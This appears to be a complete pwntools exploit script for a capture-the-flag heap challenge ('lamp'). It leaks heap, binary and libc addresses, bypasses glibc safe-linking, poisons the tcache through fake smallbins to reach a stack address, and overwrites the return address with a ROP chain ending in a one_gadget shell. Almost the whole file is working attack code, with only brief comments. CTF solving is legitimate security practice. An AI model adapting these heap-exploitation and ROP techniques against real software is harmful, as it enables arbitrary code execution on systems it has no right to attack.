#!/usr/bin/env python3

from pwn import *

exe = ELF("lamp_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
debug_script='''
#decompiler connect binja
b main
continue
set gdb-workaround-stop-event 1
set resolve-heap-via-heuristic force
#b malloc
#commands
#fin
#end
continue
'''

def conn():
    if args.REMOTE:
        p = remote("chall.lac.tf", 31169)
    elif args.D:
        p = gdb.debug([], exe=exe.path, gdbscript=debug_script, env=[('SHELL', '/bin/bash'), ('A', 'B'), ('C', 'D')])
    else:
        #p = remote("localhost", 31169)
        p = process(["./run"] if not args.STRACE else ["strace", "-follow-forks", "-o", "strace.out", "./run"])

    return p

def main():
    p = conn()

    # tick 197 certified

    # get pointer protection key
    heap_base = u64(p.recv(8)) << 12
    heap_size = 0x21000
    def protect(addr, ptr):
        return ptr ^ (addr >> 12)

    #libc_align_base = (key << 12) & ~0xfffff
    #libc_aslr_guess = libc_align_base + 0xcc6b3200000
    #libc_aslr_guess = int(input("What's libc base?"), 0)
    #fastbin_addr = libc_aslr_guess+0x203ad0
    #progname_addr = libc_aslr_guess + 0x204370

    print(hex(heap_base))

    top = heap_base + 0x2b0

    def free(size):
        assert(size & 0xF == 0)
        nonlocal top, heap_base, heap_size
        p.send(b"b8")
        p.send(b"a" * 0xb0)
        p.send(b"bbbbbbbb")

        top += 0xc0

        # Page-align top
        p.send(p64((0x1000 - (top & 0xFFF) | 1)))
        p.send(b"\n")

        while (top & 0xFFF < 0xE00):
            p.send(b"f0\n")
            top += 0x100

        while (top & 0xFFF < 0xF00 - size):
            p.send(b"30\n")
            top += 0x40

        # Leave just enough space for a chunk of size 'size'
        alloc_size = 0x1000 - (top & 0xFFF) - size - 0x28
        p.send(("%02X" % alloc_size).encode('utf-8'))
        p.send(b"\n")
        top += alloc_size

        # Now allocate a chunk that's too big
        p.send(b"f0\n")
        top = heap_base + heap_size + 0x100
        heap_size += 0x22000
        print(hex(top), hex(heap_size))

    # Fill up tcache[0x60]
    for i in range(11):
        free(0x60)

    # Now we have some stuff in smallbins
    # Put some stuff in another tcache size too
    for i in range(3):
        free(0x40)

    # ...and another couple things in smallbins
    for i in range(3):
        free(0x60)

    # We want to transfer a useful stack address into the tcache.
    # In order to do this, we'll create a fake pile of smallbins, and then allocate one of them
    # causing the rest to be transferred into the tcache until it's full.
    # We then have a valid stack address in the tcache, and we can corrupt the bottom bits of it

    fake_bins = heap_base + 0xcbf90
    target_bin = heap_base + 0xedf78
    start_bin = heap_base + 0x1dbf90

    start_overwrite_from = heap_base + 0x1b9fb0

    print("fake", hex(fake_bins))
    print("target", hex(target_bin))
    print("start", hex(start_bin))

    p.send(b"58")
    BINS = 0
    for i in range(BINS):
        # This ended up being unused, it was here to help control the length
        # of the list of smallbins leading to the bin we wanted to overwrite
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # fd
        p.send(p64(fake_bins + (i+1)*0x20)) # bk

    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"X" * (target_bin - fake_bins - BINS*0x20 - 0x18))
    p.send(b"\x00" * 16)
    p.send(b"\xc8\x46\n")

    p.send(b"30")
    p.send(b"Y" * (start_bin - start_overwrite_from))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"\n")

    # Pop the tcache entries.
    for i in range(7):
        p.send(b"58\n")

    # Pop a smallbin entry, causing malloc to move entries from the smallbin to the tcache
    p.send(b"58\n")

    # We need to overwrite the bottom bits of the stack address to something more useful.
    # Use tcache[0x20] to poison tcache[0x40] to point to tcache[0x60]

    tcache_20_dst_addr = heap_base + 0x2a0
    tcache_20_addr = heap_base + 0x90
    tcache_40_addr = heap_base + 0xa0
    tcache_40_dst_addr = heap_base + 0x197fb0
    tcache_60_addr = heap_base + 0xb0
    tcache_80_addr = heap_base + 0xc0
    tcache_e0_addr = heap_base + 0xf0
    tcache_overwrite_addr = heap_base

    p.send(b"18")
    p.send(b"T" * (tcache_40_dst_addr - tcache_20_dst_addr))
    p.send(p64(protect(tcache_40_dst_addr, tcache_overwrite_addr)))
    p.send(b"\n")

    p.send(b"38\n38")

    # pad to start of counts
    p.send(b"T" * 0x10)

    # write some nice big counts
    p.send(b"\x42" * 0x80)


    # Duplciate tcache[0x60] into tcache[0x20], tcache[0xa0], tcache[0xc0]
    p.send(p64(tcache_80_addr))
    p.send(p64(0))
    
    # Let us resume writing after tcache[60]
    p.send(p64(tcache_80_addr))

    # Change stack address to something nice and high up
    p.send(p64(0))
    p.send(b"\x00\xe0\n")

    p.send(b"38")
    # write 80/a0/c0
    p.send(p64(tcache_60_addr))
    p.send(p64(0))
    p.send(p64(tcache_80_addr))
    p.send(p64(0))
    p.send(p64(tcache_80_addr))
    p.send(p64(0))
    p.send(p64(tcache_80_addr))
    p.send(p64(0))
    p.send(p64(tcache_80_addr))
    p.send(p64(0))
    p.send(b"\n")

    # Read tcache[0x80], which will scramble tcache[0x60]
    p.send(b"78\n")

    # Read tcache[0x20/a0/c0], which will unscramble the stack address
    p.send(b"08\n")
    p.send(b"98\n")
    p.send(b"b8\n")
    p.send(b"d8\n")
    p.send(b"f8\n")

    p.send(b"98")

    offset = 0x8
    p.send(b"\x00" * offset + b'\x00')

    # wait for buffers to flush
    while p.recv(timeout=1):
        pass

    while True:
        offset += 16
        print(hex(offset))
        p.send(b"\x1f" * 16)
        if p.recvuntil(b'1', timeout=0.5 if args.REMOTE else 0.01) != b'':
            break

    bin_base = u64(b'1' + p.recv(7)) - 0x1131
    print("bin_base:", hex(bin_base))

    # Go to return address
    p.send(b"b8")
    p.send(b"\x00" * offset)

    # Leave the return address as is
    real_return = bin_base + 0x1196
    p.send(p64(real_return))
    
    # Afterwards, write some ret gadgets
    ret = bin_base + 0x11f8
    for i in range(20):
        p.send(p64(ret))

    libcleak = heap_base + 0x1fdf98
    pop_rbx = bin_base + 0x12c2
    p.send(p64(pop_rbx))
    p.send(p64(libcleak))
    p.send(p64(libcleak))
    writegadget = bin_base + 0x111f
    p.send(p64(writegadget))
    p.send(b'\n')

    # Go back to return address
    p.send(p16((ret >> 40)))
    p.send(b'\x00' * offset)
    p.send(b'\xf8')

    p.recvuntil(b'p')
    libc_base = u64(b'p' + p.recv(7)) - 0x203b70

    print("libc:", hex(libc_base))

    # Go to return address
    p.send(b"58")
    p.send(b"\x00" * (offset + 0xc0))

    # Leave the return address as is
    real_return = bin_base + 0x1196
    p.send(p64(real_return))
    
    # Afterwards, set up a onegadget
    p.send(p64(pop_rbx))
    p.send(p64(0))
    p.send(p64(libc_base + 0x206000))   # rbp
    p.send(p64(libc_base + 0xef4ce))
    p.send(b'\n')

    # Go back to return address
    p.send(b"f8")
    p.send(b'\x00' * (offset + 0xc0))
    p.send(b'\xf8')

    p.interactive()


if __name__ == "__main__":
    main()
